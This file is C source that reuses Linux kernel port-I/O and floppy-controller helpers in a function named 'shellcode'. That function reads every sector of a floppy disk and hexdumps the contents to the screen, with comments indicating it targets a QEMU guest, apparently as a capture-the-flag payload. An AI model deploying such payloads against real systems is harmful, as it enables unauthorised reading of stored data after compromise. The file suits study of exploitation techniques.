/* include/linux/types.h */
typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef _Bool bool;

/* arch/x86/include/asm/irqflags.h */
static inline void
native_irq_disable (void)
{
  asm volatile("cli" : : : "memory");
}

static inline void
native_halt (void)
{
  asm volatile("hlt" : : : "memory");
}

/* kernel/panic.c */
__attribute__ ((noreturn)) static void
panic (const char *fmt, ...)
{
  (void)fmt;
  native_irq_disable ();
  native_halt ();
  __builtin_unreachable ();
}

/* arch/x86/boot/boot.h */
static inline void
outb (u8 v, u16 port)
{
  asm volatile("outb %0,%1" : : "a"(v), "dN"(port));
}

static inline u8
inb (u16 port)
{
  u8 v;
  asm volatile("inb %1,%0" : "=a"(v) : "dN"(port));
  return v;
}

static inline void
outw (u16 v, u16 port)
{
  asm volatile("outw %0,%1" : : "a"(v), "dN"(port));
}

static inline u16
inw (u16 port)
{
  u16 v;
  asm volatile("inw %1,%0" : "=a"(v) : "dN"(port));
  return v;
}

static inline void
outl (u32 v, u16 port)
{
  asm volatile("outl %0,%1" : : "a"(v), "dN"(port));
}

static inline u32
inl (u16 port)
{
  u32 v;
  asm volatile("inl %1,%0" : "=a"(v) : "dN"(port));
  return v;
}

/* include/uapi/linux/fdreg.h */
#define FD_IOPORT 0x3f0
#define FD_DOR (2 + FD_IOPORT)
#define FD_STATUS (4 + FD_IOPORT)
#define FD_DATA (5 + FD_IOPORT)
#define STATUS_BUSY 0x10  /* FDC busy */
#define STATUS_DMA 0x20   /* 0- DMA mode */
#define STATUS_DIR 0x40   /* 0- cpu->fdc */
#define STATUS_READY 0x80 /* Data reg ready */
#define FD_READ 0xE6      /* read with MT, MFM, SKip deleted */
#define FD_VERSION 0x10   /* get version code */
#define FD_CONFIGURE 0x13 /* configure FIFO operation */

/* drivers/block/floppy.c */
#define MAX_REPLIES 16
static unsigned char reply_buffer[MAX_REPLIES];

static int
wait_til_ready (void)
{
  while (1)
    {
      int status = inb (FD_STATUS);
      if (status & STATUS_READY)
        return status;
    }
}

static void
output_byte (char byte)
{
  if (wait_til_ready () < 0)
    panic ("output_byte");
  outb (byte, FD_DATA);
}

/* gets the response from the fdc */
static int
result (void)
{
  for (int i = 0; i < MAX_REPLIES; i++)
    {
      int status = wait_til_ready ();
      status &= STATUS_DIR | STATUS_READY | STATUS_BUSY | STATUS_DMA;
      if ((status & ~STATUS_BUSY) == STATUS_READY)
        return i;
      if (status == (STATUS_DIR | STATUS_READY | STATUS_BUSY))
        reply_buffer[i] = inb (FD_DATA);
      else
        break;
    }
  panic ("result");
}

static void
reset_fdc (void)
{
  outb (0x80, FD_STATUS);
}

/* homebrew */
#define VIDEO ((char *)0xb8000)
#define ROWS 25
#define COLS 80
static int video_pos = 0;

static void
cls ()
{
  for (int i = 0; i < ROWS * COLS * 2;)
    {
      VIDEO[i++] = ' ';
      VIDEO[i++] = 0x0f;
    }
  video_pos = 0;
}

static char HEX[] = { '0', '1', '2', '3', '4', '5', '6', '7',
                      '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' };

static void
hexdump (const unsigned char *buf, int n)
{
  for (int i = 0; i < n; i++)
    {
      VIDEO[video_pos] = HEX[buf[i] >> 4];
      VIDEO[video_pos + 2] = HEX[buf[i] & 0xf];
      video_pos += 4;
    }
}

static void
check_version (void)
{
  output_byte (FD_VERSION);
  if (result () != 1 || reply_buffer[0] != 0x90)
    panic ("FD_VERSION");
}

__attribute__ ((used)) static void
shellcode (void)
{
  int drive = 0;

  /* Make QEMU happy. Nothing else matters. */

  /* QEMU does not care about motors. */
  outb (4 | drive, FD_DOR); /* IRQ off */

  /* QEMU assumes drive polling is off. */
  /* QEMU assumes FIFO is on and threshold is 16. */
  output_byte (FD_CONFIGURE);
  output_byte (0);
  output_byte (1 << 6 /* enable implied seek */);
  output_byte (0); /* pre-compensation from track 0 upwards */

  for (int c = 0; c < 80; c++)
    {
      for (int s = 1; s <= 18; s++)
        {
          for (int h = 0; h < 2; h++)
            {
              output_byte (FD_READ);
              output_byte ((h << 2) | drive); /* head + drive */
              output_byte (c);                /* cyl */
              output_byte (h);                /* head */
              output_byte (s);                /* sector */
              output_byte (2);                /* 512 bytes per sector */
              output_byte (18);               /* last sector 18 */
              output_byte (0x1b);             /* GAP1 */
              output_byte (0xff);             /* 512 bytes per sector */

              u8 data[512];
              u8 orall = 0;
              for (unsigned int i = 0; i < sizeof (data); i++)
                {
                  data[i] = inb (FD_DATA);
                  orall |= data[i];
                }
              if (orall == 0)
                continue;
              cls ();
              hexdump (data, sizeof (data));
              int i = 250000000;
              asm volatile("1: dec %0\n"
                           "jnz 1b\n"
                           : "+r"(i)::"cc");
            }
        }
    }

  if (0)
    {
      check_version ();
      outb (0x4, FD_DOR); /* PIO mode, drive 0 */
      reset_fdc ();
      hexdump ((const unsigned char *)shellcode, 0x20);
    }
  native_irq_disable ();
  native_halt ();
}
